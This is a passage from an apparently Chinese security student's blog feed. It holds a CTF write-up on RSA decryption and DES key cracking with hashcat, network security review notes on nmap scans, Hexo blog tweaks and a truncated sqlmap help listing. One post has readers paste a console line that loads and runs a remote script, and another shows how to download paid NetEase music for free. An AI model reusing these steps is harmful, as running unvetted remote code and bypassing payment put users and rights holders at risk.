class="line">yq=gmpy2.invert(q,p)</span><br><span class="line">r=(yp*p*mq+yq*q*mp)%n</span><br><span class="line">rr=n-r</span><br><span class="line">s=(yp*p*mq-yq*q*mp)%n</span><br><span class="line">ss=n-s</span><br><span class="line">print hex(r)[2:].decode(&apos;hex&apos;)</span><br><span class="line">print hex(rr)[2:].decode(&apos;hex&apos;)</span><br><span class="line">print hex(s)[2:].decode(&apos;hex&apos;)</span><br><span class="line">print hex(ss)[2:].decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure><p>其中一个就是需要的明文<br><img src="/2018/12/16/cumt-match/0x03-2.png" alt=""></p><h3 id="0x01-Second-Level"><a href="#0x01-Second-Level" class="headerlink" title="0x01 Second Level"></a>0x01 Second Level</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>给了一堆密文 提示是DES唯密文攻击</p><ol><li>发现有20组密文结尾都是<code>ea9c3c12181a1e82</code><img src="/2018/12/16/cumt-match/0x04-1.png" alt=""></li><li>相同结尾的密文长度都是16的倍数(这里只截了一部分密文的长度) 所以大概为8bytes一组<img src="/2018/12/16/cumt-match/0x04-2.png" alt=""></li><li>所以判断最后相同的数据是DES加密里的 padding 填充数据<code>0808080808080808</code></li><li>得到一组明文密文对 <code>ea9c3c12181a1e82:0808080808080808</code></li></ol><h4 id="爆破key"><a href="#爆破key" class="headerlink" title="爆破key"></a>爆破key</h4><ol><li>DES加密算法有固定长度8bytes的key</li><li>所以可以爆破八位的key</li><li>使用<code>hashcat</code>工具进行爆破</li></ol><p>安装<code>hashcat</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">brew search hashcat</span><br><span class="line">brew install hashcat</span><br><span class="line">brew info hashcat</span><br></pre></td></tr></table></figure><p>全小写字母爆破失败了(差点以为凉了2333) 换了全大写字母 爆破成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 14000 ea9c3c12181a1e82:0808080808080808 -a 3 &apos;?u?u?u?u?u?u?u?u&apos; --force</span><br></pre></td></tr></table></figure><p>爆破key 的参数函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数字?d</span><br><span class="line">小写字母?l</span><br><span class="line">大写字母?u</span><br><span class="line">特殊字符?s</span><br><span class="line">大小写字母+特殊字符?a</span><br></pre></td></tr></table></figure><p><code>&#39;?u?u?u?u?u?u?u?u&#39;</code>key为表示8个大写字符<br><code>-m 14000</code> 表示是DES</p><p><img src="/2018/12/16/cumt-match/0x04-4.png" alt=""><br><code>-a 3</code>表示是爆破key</p><p><img src="/2018/12/16/cumt-match/0x04-3.png" alt=""></p><p>最后大概半小时不到 跑出 <code>key=&#39;JFRYOMPR&#39;</code></p><p><img src="/2018/12/16/cumt-match/0x04-5.png" alt=""></p><h4 id="DES解密"><a href="#DES解密" class="headerlink" title="DES解密"></a>DES解密</h4><p>感想队友提供的在线DES解密网站 提供了DES各种的工作模式对应的加密解密<br>把密文去掉换行 直接丢到里面去<a href="https://www.tools4noobs.com/online_tools/decrypt/" target="_blank" rel="noopener">https://www.tools4noobs.com/online_tools/decrypt/</a><br><img src="/2018/12/16/cumt-match/mmx22.png" alt=""><br>解密得到明文 好像是服务器的信息啥的 完全看不懂 在里面找到flag<br><img src="/2018/12/16/cumt-match/0x04-6.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#去了空行的密文:</span><br><span class="line">c=&aposapos;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      CUMTCTF‘2019第一次双月赛
    
    </summary>
    
      <category term="Writeup" scheme="http://bobosec.top/categories/Writeup/"/>
    
    
      <category term="各类WP" scheme="http://bobosec.top/tags/%E5%90%84%E7%B1%BBWP/"/>
    
  </entry>
  
  <entry>
    <title>网安复习</title>
    <link href="http://bobosec.top/2018/11/14/review/"/>
    <id>http://bobosec.top/2018/11/14/review/</id>
    <published>2018-11-14T06:27:19.000Z</published>
    <updated>2018-12-23T05:35:55.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次很认真的网安复习"><a href="#记一次很认真的网安复习" class="headerlink" title="记一次很认真的网安复习"></a>记一次很认真的网安复习</h1><h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><h3 id="网络安全面临的主要威胁：信息泄露，破坏信息，拒绝服务"><a href="#网络安全面临的主要威胁：信息泄露，破坏信息，拒绝服务" class="headerlink" title="网络安全面临的主要威胁：信息泄露，破坏信息，拒绝服务"></a>网络安全面临的主要威胁：信息泄露，破坏信息，拒绝服务</h3><h3 id="网络安全的基本属性：可用性，保密性，完整性"><a href="#网络安全的基本属性：可用性，保密性，完整性" class="headerlink" title="网络安全的基本属性：可用性，保密性，完整性"></a>网络安全的基本属性：可用性，保密性，完整性</h3><h3 id="OSI安全体系中的安全服务："><a href="#OSI安全体系中的安全服务：" class="headerlink" title="OSI安全体系中的安全服务："></a>OSI安全体系中的安全服务：</h3><h4 id="五类服务："><a href="#五类服务：" class="headerlink" title="五类服务："></a>五类服务：</h4><ol><li>认证服务</li><li>访问控制服务</li><li>机密性服务</li><li>不可否认服务</li><li>完整性服务</li></ol><h4 id="八种机制："><a href="#八种机制：" class="headerlink" title="八种机制："></a>八种机制：</h4><ol><li>加密</li><li>数字签名</li><li>访问控制</li><li>信息完整性</li><li>鉴别交换</li><li>业务量填充</li><li>路由控制</li><li>公证</li></ol><h2 id="黑客攻击流程"><a href="#黑客攻击流程" class="headerlink" title="黑客攻击流程"></a>黑客攻击流程</h2><ol><li>踩点（信息搜索，whios查询，dns查询，网络侦察）</li><li>扫描</li><li>查点</li><li>攻击实施阶段</li><li>攻击善后阶段</li><li>踩点-扫描-查点-获取访问权限-提权-窃取信息-掩踪灭迹-创建后门→拒绝服务</li></ol><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>一种通过模拟攻击者的技术与方法，挫败目标系统的安全控制措施并取得访问控制权的安全测试方法。、</p><h3 id="渗透测试的分类："><a href="#渗透测试的分类：" class="headerlink" title="渗透测试的分类："></a>渗透测试的分类：</h3><ol><li>白盒测试（知道一切信息）</li><li>黑盒测试（不知道一切信息）</li><li>灰盒测试（综合两种情况）</li></ol><h3 id="渗透测试的七个阶段："><a href="#渗透测试的七个阶段：" class="headerlink" title="渗透测试的七个阶段："></a>渗透测试的七个阶段：</h3><ol><li>前期交互阶段：和客户讨论确定测试的范围还有目标。</li><li>情报搜集阶段：利用各种方法搜集目标信息</li><li>威胁建模阶段：用搜集到的信息进行威胁建模，确定攻击方法，确定攻击切入点等。</li><li>漏洞分析阶段：综合信息找出实施渗透的攻击点。</li><li>渗透攻击阶段：开始入侵攻击目标。</li><li>后渗透攻击阶段：根据目标的信息，找到对目标测试系统由重要影响的攻击路径。</li><li>报告阶段：为客户书写渗透测试报告，体现获取到的信息及解决方案。</li></ol><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><h3 id="扫描的三个阶段："><a href="#扫描的三个阶段：" class="headerlink" title="扫描的三个阶段："></a>扫描的三个阶段：</h3><ol><li>确定目标系统是否存活，一般用ping扫描。</li><li>确定存活系统上运行的服务，一般用端口扫描技术。</li><li>探查目标系统运行的操作系统，一般用旗标抓取技术和协议指纹识别技术。</li></ol><h3 id="扫描的分类"><a href="#扫描的分类" class="headerlink" title="扫描的分类"></a>扫描的分类</h3><h4 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h4><ol><li>ping扫描<br>原理是发出特定类型的数据包，分析系统响应结果的过程。</li><li>nmap的 -sP命令</li></ol><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="TCP连接扫描"><a href="#TCP连接扫描" class="headerlink" title="TCP连接扫描"></a>TCP连接扫描</h5><ol><li>TCP连接扫描<br>原理是尝试与目标主机建立tcp连接（三握手），如果被扫描端口开放，则建立连接成功。</li><li>nmap -sT命令</li></ol><h5 id="TCP-SYN扫描"><a href="#TCP-SYN扫描" class="headerlink" title="TCP SYN扫描"></a>TCP SYN扫描</h5><ol><li>半开扫描，完不成一次完整的TCP连接</li><li>nmap -sS命令</li></ol><h5 id="TCP-FIN扫描"><a href="#TCP-FIN扫描" class="headerlink" title="TCP FIN扫描"></a>TCP FIN扫描</h5><ol><li>原理是关闭的端口会丢弃数据包并用RST来回复FIN数据包。开放的端口只会简单的丢弃FIN数据包。</li><li>nmap -sF命令</li></ol><h5 id="TCP-ACK扫描"><a href="#TCP-ACK扫描" class="headerlink" title="TCP ACK扫描"></a>TCP ACK扫描</h5><p>nmap -sA</p><h5 id="TCP-窗口扫描"><a href="#TCP-窗口扫描" class="headerlink" title="TCP 窗口扫描"></a>TCP 窗口扫描</h5><p>nmap -sW</p><h5 id="TCP-Maimon扫描"><a href="#TCP-Maimon扫描" class="headerlink" title="TCP Maimon扫描"></a>TCP Maimon扫描</h5><p>nmap -sM</p><h5 id="UDP-扫描"><a href="#UDP-扫描" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h5><p>nmap -sU</p><h2 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h2><ol><li>nmap </li><li>nessus</li><li>OpenVAS</li></ol><h2 id="网卡工作模式"><a href="#网卡工作模式" class="headerlink" title="网卡工作模式"></a>网卡工作模式</h2><ol><li>广播模式</li><li>组播模式</li><li>单播模式</li><li>混杂模式</li></ol><h2 id="交换式局域网嗅探技术"><a href="#交换式局域网嗅探技术" class="headerlink" title="交换式局域网嗅探技术"></a>交换式局域网嗅探技术</h2>]]></content>
    
    <summary type="html">
    
      review
    
    </summary>
    
      <category term="复习" scheme="http://bobosec.top/categories/%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="网安" scheme="http://bobosec.top/tags/%E7%BD%91%E5%AE%89/"/>
    
  </entry>
  
  <entry>
    <title>在自己博客创建在线聊天室</title>
    <link href="http://bobosec.top/2018/11/11/chat-room/"/>
    <id>http://bobosec.top/2018/11/11/chat-room/</id>
    <published>2018-11-11T06:49:50.000Z</published>
    <updated>2018-11-11T06:54:33.241Z</updated>
    
    <content type="html"><![CDATA[<p>效果可以看下图：<br><img src="/2018/11/11/chat-room/chat.jpg" alt=" "><br>直接在控制台执行以下代码即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var s=document.createElement(&apos;script&apos;); s.src=&apos;https://topurl.cn/chat.js&apos;; document.body.append(s);</span><br></pre></td></tr></table></figure><br>这样就可以在网页上和正在浏览这个网页的人说话了，手动感谢Ivan大佬给的代码。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;效果可以看下图：&lt;br&gt;&lt;img src=&quot;/2018/11/11/chat-room/chat.jpg&quot; alt=&quot; &quot;&gt;&lt;br&gt;直接在控制台执行以下代码即可&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
      <category term="hexo小技巧" scheme="http://bobosec.top/categories/hexo%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="实用技巧" scheme="http://bobosec.top/tags/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>Hexo NEXT主题添加点击爱心效果</title>
    <link href="http://bobosec.top/2018/11/10/click-love/"/>
    <id>http://bobosec.top/2018/11/10/click-love/</id>
    <published>2018-11-09T16:02:19.000Z</published>
    <updated>2018-11-09T16:09:27.255Z</updated>
    
    <content type="html"><![CDATA[<p>今天晚上无聊一直在收拾自己的博客，因为前面自己的博客实在太丑了hhh</p><h1 id="Hexo-NEXT主题添加点击爱心效果"><a href="#Hexo-NEXT主题添加点击爱心效果" class="headerlink" title="Hexo NEXT主题添加点击爱心效果"></a>Hexo NEXT主题添加点击爱心效果</h1><h2 id="创建js文件"><a href="#创建js文件" class="headerlink" title="创建js文件"></a>创建js文件</h2><p>在<code>/themes/next/source/js/src</code>下新建文件<code>clicklove.js</code>，接着把该链接下的代码拷贝粘贴到<code>clicklove.js</code>文件中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!function(e,t,a)&#123;function n()&#123;c(&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &apos;&apos;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;),o(),r()&#125;function r()&#123;for(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText=&quot;left:&quot;+d[e].x+&quot;px;top:&quot;+d[e].y+&quot;px;opacity:&quot;+d[e].alpha+&quot;;transform:scale(&quot;+d[e].scale+&quot;,&quot;+d[e].scale+&quot;) rotate(45deg);background:&quot;+d[e].color+&quot;;z-index:99999&quot;);requestAnimationFrame(r)&#125;function o()&#123;var t=&quot;function&quot;==typeof e.onclick&amp;&amp;e.onclick;e.onclick=function(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;function i(e)&#123;var a=t.createElement(&quot;div&quot;);a.className=&quot;heart&quot;,d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;function c(e)&#123;var a=t.createElement(&quot;style&quot;);a.type=&quot;text/css&quot;;try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)&#125;function s()&#123;return&quot;rgb(&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;)&quot;&#125;var d=[];e.requestAnimationFrame=function()&#123;return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);</span><br></pre></td></tr></table></figure><br>代码有点长，因为网上好多教程是让点击一个网站拿源码再复制到js，结果那个网站已经打不开了</p><h2 id="修改-layout-swig"><a href="#修改-layout-swig" class="headerlink" title="修改_layout.swig"></a>修改_layout.swig</h2><p>在<code>\themes\next\layout\_layout.swig</code>文件末尾添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 页面点击小红心 --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clicklove.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>这样就好啦~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天晚上无聊一直在收拾自己的博客，因为前面自己的博客实在太丑了hhh&lt;/p&gt;
&lt;h1 id=&quot;Hexo-NEXT主题添加点击爱心效果&quot;&gt;&lt;a href=&quot;#Hexo-NEXT主题添加点击爱心效果&quot; class=&quot;headerlink&quot; title=&quot;Hexo NEXT主题添
      
    
    </summary>
    
      <category term="Hexo小技巧" scheme="http://bobosec.top/categories/Hexo%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="实用技巧" scheme="http://bobosec.top/tags/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>怎样不用任何插件下载网易云收费音乐</title>
    <link href="http://bobosec.top/2018/11/05/music/"/>
    <id>http://bobosec.top/2018/11/05/music/</id>
    <published>2018-11-05T09:54:47.000Z</published>
    <updated>2018-11-05T10:22:52.869Z</updated>
    
    <content type="html"><![CDATA[<p>今天突然有人问我IT男会不会免费下载网易云收费音乐，我说试试吧<br>于是在来回琢磨种发现了这个小技巧，不需要任何插件就可以，很简单<br>首先我们打开网易云音乐官网，选一首下载需要收费的歌曲，如图<br>我们下载一个最近很火的《沙漠骆驼》，在客户端上可以看到是收费的。<br><img src="/2018/11/05/music/1.jpg" alt=" "><br>我们打开网易云官网搜索《沙漠骆驼》<br><img src="/2018/11/05/music/2.jpg" alt=" "><br>记住后面的歌曲ID<br>这时我们需用到歌曲解析接口<a href="http://music.163.com/song/media/outer/url?id=().mp3" target="_blank" rel="noopener">http://music.163.com/song/media/outer/url?id=().mp3</a><br>括号里面写你想下载的歌曲的ID<br><img src="/2018/11/05/music/3.jpg" alt=" "><br>来到了这个页面，这说明我们的链接解析成功<br>直接鼠标右键下载即可<br><img src="/2018/11/05/music/4.jpg" alt=" "><br>下载到桌面，但是名字是乱码，自己重命名一下即可<br><img src="/2018/11/05/music/5.jpg" alt=" "><br>下载成功，收费歌曲已经被我们不用安装任何插件下载下来了，美滋滋</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天突然有人问我IT男会不会免费下载网易云收费音乐，我说试试吧&lt;br&gt;于是在来回琢磨种发现了这个小技巧，不需要任何插件就可以，很简单&lt;br&gt;首先我们打开网易云音乐官网，选一首下载需要收费的歌曲，如图&lt;br&gt;我们下载一个最近很火的《沙漠骆驼》，在客户端上可以看到是收费的。&lt;b
      
    
    </summary>
    
    
      <category term="实用技巧" scheme="http://bobosec.top/tags/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap命令</title>
    <link href="http://bobosec.top/2018/11/03/sqlmap/"/>
    <id>http://bobosec.top/2018/11/03/sqlmap/</id>
    <published>2018-11-03T15:25:10.000Z</published>
    <updated>2018-11-03T15:30:22.265Z</updated>
    
    <content type="html"><![CDATA[<p>马上要打一场个人赛，在这里码一次sqlmap常用命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line">Usage: python sqlmap.py [options]</span><br><span class="line"> </span><br><span class="line">Options（选项）:</span><br><span class="line"> </span><br><span class="line">  -h, --help            Show basic help message and exit        显示此帮助消息并退出</span><br><span class="line">  -hh                   Show advanced help message and exit     展示先进的帮助信息并退出</span><br><span class="line">  --version             Show program&apos;s version number and exit  显示程序的版本号并退出</span><br><span class="line">  -v VERBOSE            Verbosity level: 0-6 (default 1)        详细级别：0-6（默认为1） </span><br><span class="line"> </span><br><span class="line">  Target（目标）:</span><br><span class="line"> </span><br><span class="line">    At least one of these options has to be provided to define the  </span><br><span class="line">    target(s)</span><br><span class="line">    以下至少需要设置其中一个选项，设置目标URL。</span><br><span class="line"> </span><br><span class="line">    -d DIRECT           Connection string for direct database connection        直接连接到数据库。</span><br><span class="line">    -u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)   目标URL。</span><br><span class="line">    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file   解析目标(s)从Burp或WebScarab代理日志文件</span><br><span class="line">    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file          解析目标(s)从远程站点地图文件(.xml)</span><br><span class="line">    -m BULKFILE         Scan multiple targets given in a textual file           扫描文本文件中给出的多个目标</span><br><span class="line">    -r REQUESTFILE      Load HTTP request from a file                           从文件加载HTTP请求</span><br><span class="line">    -g GOOGLEDORK       Process Google dork results as target URLs              处理Google dork的结果作为目标URL。</span><br><span class="line">    -c CONFIGFILE       Load options from a configuration INI file              从INI配置文件中加载选项。</span><br><span class="line"> </span><br><span class="line">  Request（请求）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to specify how to connect to the target URL   这些选项可以用来指定如何连接到目标URL。</span><br><span class="line"> </span><br><span class="line">    --method=METHOD     Force usage of given HTTP method (e.g. PUT)          强制使用给定的HTTP方法（e.g. PUT）</span><br><span class="line">    --data=DATA         Data string to be sent through POST                  通过POST发送的数据字符串</span><br><span class="line">    --param-del=PARA..  Character used for splitting parameter values        用于拆分参数值的字符</span><br><span class="line">    --cookie=COOKIE     HTTP Cookie header value                             HTTP Cookie头的值</span><br><span class="line">    --cookie-del=COO..  Character used for splitting cookie values           用于分割Cookie值的字符</span><br><span class="line">    --load-cookies=L..  File containing cookies in Netscape/wget format      包含Netscape / wget格式的cookie的文件</span><br><span class="line">    --drop-set-cookie   Ignore Set-Cookie header from response               从响应中忽略Set-Cookie头</span><br><span class="line">    --user-agent=AGENT  HTTP User-Agent header value                         指定 HTTP User - Agent头  </span><br><span class="line">    --random-agent      Use randomly selected HTTP User-Agent header value   使用随机选定的HTTP User - Agent头 </span><br><span class="line">    --host=HOST         HTTP Host header value                                HTTP主机头值</span><br><span class="line">    --referer=REFERER   HTTP Referer header value                             指定 HTTP Referer头</span><br><span class="line">    -H HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)      额外header</span><br><span class="line">    --headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;) 额外header</span><br><span class="line">    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI) HTTP认证类型(Basic, Digest, NTLM or PKI)</span><br><span class="line">    --auth-cred=AUTH..  HTTP authentication credentials (name:password)       HTTP认证凭证(name:password)</span><br><span class="line">    --auth-file=AUTH..  HTTP authentication PEM cert/private key file         HTTP认证 PEM认证/私钥文件</span><br><span class="line">    --ignore-401        Ignore HTTP Error 401 (Unauthorized)                  忽略HTTP错误401(未经授权)</span><br><span class="line">    --proxy=PROXY       Use a proxy to connect to the target URL              使用代理连接到目标网址</span><br><span class="line">    --proxy-cred=PRO..  Proxy authentication credentials (name:password)      代理认证证书(name:password) </span><br><span class="line">    --proxy-file=PRO..  Load proxy list from a file                           从文件中加载代理列表</span><br><span class="line">    --ignore-proxy      Ignore system default proxy settings                  忽略系统默认代理设置</span><br><span class="line">    --tor               Use Tor anonymity network                             使用Tor匿名网络</span><br><span class="line">    --tor-port=TORPORT  Set Tor proxy port other than default                 设置Tor代理端口而不是默认值</span><br><span class="line">    --tor-type=TORTYPE  Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5) 设置Tor代理类型</span><br><span class="line">    --check-tor         Check to see if Tor is used properly                  检查Tor是否正确使用</span><br><span class="line">    --delay=DELAY       Delay in seconds between each HTTP request             每个HTTP请求之间的延迟（秒）</span><br><span class="line">    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30) 秒超时连接前等待（默认30）</span><br><span class="line">    --retries=RETRIES   Retries when the connection timeouts (default 3)       连接超时时重试（默认值3）</span><br><span class="line">    --randomize=RPARAM  Randomly change value for given parameter(s)           随机更改给定参数的值(s)</span><br><span class="line">    --safe-url=SAFEURL  URL address to visit frequently during testing         在测试期间频繁访问的URL地址</span><br><span class="line">    --safe-post=SAFE..  POST data to send to a safe URL                        POST数据发送到安全URL</span><br><span class="line">    --safe-req=SAFER..  Load safe HTTP request from a file                     从文件加载安全HTTP请求</span><br><span class="line">    --safe-freq=SAFE..  Test requests between two visits to a given safe URL   在两次访问给定安全网址之间测试请求</span><br><span class="line">    --skip-urlencode    Skip URL encoding of payload data                      跳过有效载荷数据的URL编码</span><br><span class="line">    --csrf-token=CSR..  Parameter used to hold anti-CSRF token                 